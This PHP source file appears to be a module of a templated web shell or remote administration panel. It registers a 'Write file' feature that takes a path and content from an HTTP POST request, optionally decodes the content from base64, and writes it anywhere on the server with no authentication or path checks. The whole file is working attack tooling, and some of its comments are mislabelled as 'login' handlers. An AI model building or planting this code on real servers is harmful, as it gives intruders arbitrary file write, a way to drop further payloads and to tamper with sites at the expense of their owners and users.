<?php

// section.constants
$WRITE_FILE = "__FEAT_WRITE_FILE__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeWriteFilePage(&$page_content, array $features, $page, $css): void {
    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        [
            __PREFIX__makePageHeader(
                $features[$page]["title"],
                $features[$page]["description"]
            ),
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                [
                    __PREFIX__makeInput(
                        "text",
                        "Path",
                        "__PARAM_1__",
                        "C://path/to/file.txt",
                        "Fully qualified path where the file will be written.",
                        true
                    ),
                    __PREFIX__makeInput(
                        "textarea",
                        "File content",
                        "__PARAM_2__",
                        "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                        "Content of the file to write to disk.",
                        true
                    ),
                    __PREFIX__makeCheckbox(
                        "__PARAM_3__",
                        "Decode from base64",
                        "Decode the content of the file from base64 before writing it to disk."
                    ),
                ]
            ),
        ]
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 */
function __PREFIX__handleWriteFile($operation, $features): void {
    $filename               = $_POST['__PARAM_1__'];
    $should_decode_from_b64 = __PREFIX__isCheckboxActive("__PARAM_3__");
    $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];

    echo "Received content of length " . strlen($content) . " bytes.";
    echo "Writing to " . htmlentities($filename) . "...";
    flush();

    file_put_contents($filename, $content);
    echo "File written successfully.";
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 */
function __PREFIX__fileWriteHooksFeatures(&$features): void {
    global $WRITE_FILE;

    $features[] = [
        "title"       => "Write file",
        "description" => "Write a file to the given path, writing permission are required.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $WRITE_FILE,
    ];
}

// section.functions.end

// section.hooks
add_hook("features", "__PREFIX__fileWriteHooksFeatures");
add_named_hook("GET_page", $WRITE_FILE, "__PREFIX__makeWriteFilePage");
add_named_hook("POST_operation", $WRITE_FILE, "__PREFIX__handleWriteFile");
// section.hooks.end